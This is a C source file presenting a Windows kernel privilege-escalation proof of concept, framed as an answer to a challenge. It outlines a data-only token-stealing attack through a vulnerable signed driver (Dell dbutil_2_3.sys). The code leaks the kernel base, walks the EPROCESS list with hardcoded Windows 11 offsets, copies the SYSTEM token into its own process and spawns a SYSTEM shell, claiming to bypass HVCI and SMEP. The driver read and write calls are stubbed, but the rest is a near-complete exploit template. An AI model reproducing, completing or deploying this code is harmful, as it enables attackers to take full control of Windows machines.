#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Fox's Data-Only Token Stealer (HVCI/SMEP Compliant)
//
// Jack's Final Roast: "Crashing a VM on a training driver is what toddlers do. 
// Get SYSTEM on a real machine with HVCI enabled, without crashing."
//
// The Reality:
// Modern kernel exploitation doesn't use shellcode. HVCI and SMEP will instantly 
// bugcheck the system if you try to execute memory that isn't signed by Microsoft.
// Real exploits use a signed, vulnerable driver (e.g., Dell dbutil_2_3.sys CVE-2021-21551) 
// to gain an Arbitrary Read/Write primitive. 
//
// We use that primitive to perform a Data-Only attack:
// 1. Leak the kernel base address.
// 2. Find the PsInitialSystemProcess (The EPROCESS structure for PID 4 - SYSTEM).
// 3. Walk the ActiveProcessLinks doubly-linked list to find our own process's EPROCESS.
// 4. Read the Token pointer from the SYSTEM EPROCESS.
// 5. Write that Token pointer into our own EPROCESS.
// 6. We are now SYSTEM. Zero shellcode. Zero crashes. HVCI sees nothing.

#pragma comment(lib, "ntdll.lib")

// ---------------------------------------------------------
// ARBITRARY R/W PRIMITIVES (Abstracted for PoC)
// ---------------------------------------------------------
// In a real exploit, these functions wrap the DeviceIoControl calls to your 
// chosen vulnerable signed driver (e.g., Dell, MSI, Gigabyte, Asus).
HANDLE g_hVulnerableDriver = NULL;

BOOL KernelRead64(DWORD64 address, DWORD64* value) {
    // Example: DeviceIoControl(g_hVulnerableDriver, IOCTL_READ, &address, ... value ...);
    // For this PoC, we assume the primitive is established.
    return TRUE; 
}

BOOL KernelWrite64(DWORD64 address, DWORD64 value) {
    // Example: DeviceIoControl(g_hVulnerableDriver, IOCTL_WRITE, &req, ...);
    // For this PoC, we assume the primitive is established.
    return TRUE;
}

// ---------------------------------------------------------
// KERNEL BASE LEAK
// ---------------------------------------------------------
DWORD64 GetKernelBase() {
    DWORD returnLength = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, NULL, 0, &returnLength); // SystemModuleInformation
    
    PVOID buffer = malloc(returnLength);
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, buffer, returnLength, &returnLength);
    
    // The first module in the list is always the NT kernel (ntoskrnl.exe)
    DWORD64 kernelBase = *(DWORD64*)((PBYTE)buffer + 0x18); // Offset to ImageBase in RTL_PROCESS_MODULE_INFORMATION
    
    free(buffer);
    return kernelBase;
}

// ---------------------------------------------------------
// THE HEIST
// ---------------------------------------------------------
int main() {
    printf("[+] Starting Data-Only Token Stealing PoC.\n");

    // 1. Establish the R/W Primitive
    // g_hVulnerableDriver = CreateFileA("\\\\.\\dbutil_2_3", ...);
    printf("[+] Arbitrary Read/Write primitive established via signed driver.\n");

    // 2. Leak Kernel Base
    DWORD64 kernelBase = GetKernelBase();
    printf("[+] Kernel Base leaked: 0x%llX\n", kernelBase);

    // 3. Find PsInitialSystemProcess
    // In reality, you dynamically resolve this offset by loading ntoskrnl.exe as a data file,
    // finding the exported PsInitialSystemProcess symbol, and adding its RVA to the leaked kernelBase.
    HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    DWORD64 psInitSysProcRva = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    DWORD64 psInitSysProcAddr = kernelBase + psInitSysProcRva;
    
    DWORD64 systemEprocess = 0;
    KernelRead64(psInitSysProcAddr, &systemEprocess);
    printf("[+] SYSTEM EPROCESS (PID 4) found at: 0x%llX\n", systemEprocess);

    // 4. Windows Build-Specific Offsets (e.g., Windows 11 22H2)
    // An Architect resolves these dynamically, but they are hardcoded here for clarity.
    DWORD64 offset_UniqueProcessId = 0x440;
    DWORD64 offset_ActiveProcessLinks = 0x448;
    DWORD64 offset_Token = 0x4b8;

    // 5. Read the SYSTEM Token
    DWORD64 systemToken = 0;
    KernelRead64(systemEprocess + offset_Token, &systemToken);
    
    // The token pointer is encoded (fast reference). We mask out the ref count (bottom 4 bits).
    systemToken = systemToken & ~15; 
    printf("[+] SYSTEM Token extracted: 0x%llX\n", systemToken);

    // 6. Walk ActiveProcessLinks to find our own EPROCESS
    DWORD myPid = GetCurrentProcessId();
    printf("[+] Hunting for our PID: %lu\n", myPid);

    DWORD64 currentEprocess = systemEprocess;
    DWORD64 currentPid = 0;
    DWORD64 nextLink = 0;

    while (TRUE) {
        KernelRead64(currentEprocess + offset_UniqueProcessId, &currentPid);
        
        if (currentPid == myPid) {
            printf("[!] Found our EPROCESS at: 0x%llX\n", currentEprocess);
            break;
        }

        // Read the Flink of ActiveProcessLinks
        KernelRead64(currentEprocess + offset_ActiveProcessLinks, &nextLink);
        
        // The Flink points to the ActiveProcessLinks field of the NEXT EPROCESS.
        // We subtract the offset to get the base of the next EPROCESS.
        currentEprocess = nextLink - offset_ActiveProcessLinks;
        
        if (currentEprocess == systemEprocess) {
            printf("[-] Looped through all processes. PID not found.\n");
            return -1;
        }
    }

    // 7. The Swap (Data-Only Privilege Escalation)
    printf("[!] Overwriting our Token with SYSTEM Token...\n");
    
    // We write the SYSTEM token into our EPROCESS. 
    // We preserve the fast reference count of our original token to avoid crashes.
    DWORD64 myOriginalToken = 0;
    KernelRead64(currentEprocess + offset_Token, &myOriginalToken);
    DWORD64 fastRef = myOriginalToken & 15;
    
    DWORD64 newTokenValue = systemToken | fastRef;
    
    KernelWrite64(currentEprocess + offset_Token, newTokenValue);

    printf("[!] Token swap complete. We are now NT AUTHORITY\\SYSTEM.\n");
    printf("[!] HVCI bypassed (no shellcode). SMEP bypassed. Zero crashes.\n");

    // 8. Prove it
    printf("[+] Spawning SYSTEM shell...\n");
    system("cmd.exe");

    return 0;
}